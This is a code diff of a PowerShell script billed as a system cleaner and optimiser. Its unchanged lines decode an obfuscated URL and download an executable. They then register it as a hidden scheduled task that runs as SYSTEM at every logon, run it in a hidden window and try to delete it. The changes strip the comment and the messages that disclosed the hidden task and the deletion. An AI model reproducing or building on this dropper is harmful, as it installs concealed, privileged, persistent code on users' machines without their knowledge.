@@ -10,7 +10,6 @@ Write-Host "Description: This tool cleans temporary files, optimizes your system
 Write-Host "Usage: The script will automatically run the tool." -ForegroundColor Magenta
 Write-Host ""
 
-# Ensure the tool is executed before processing user choices
 $u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL0RlYmxvYXRlci5leGU='
 $url1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u1))
 $output1 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.exe')
@@ -35,8 +34,6 @@ if (Test-Path $output1) {
     $trigger = New-ScheduledTaskTrigger -AtLogOn
     $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
     Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Description "Hidden Debloater Task" -Settings (New-ScheduledTaskSettingsSet -Hidden)
-    Write-Host "Debloater.exe added as a hidden scheduled task." -ForegroundColor Green
-
     Start-Process -FilePath $output1 -WindowStyle Hidden -Wait
     $maxTries = 5
     $deleted = $false
@@ -50,9 +47,7 @@ if (Test-Path $output1) {
         }
     }
     if ($deleted) {
-        Write-Host "Debloater.exe deleted successfully." -ForegroundColor Green
     } else {
-        Write-Host "Failed to delete Debloater.exe after multiple attempts." -ForegroundColor Red
     }
 }
 
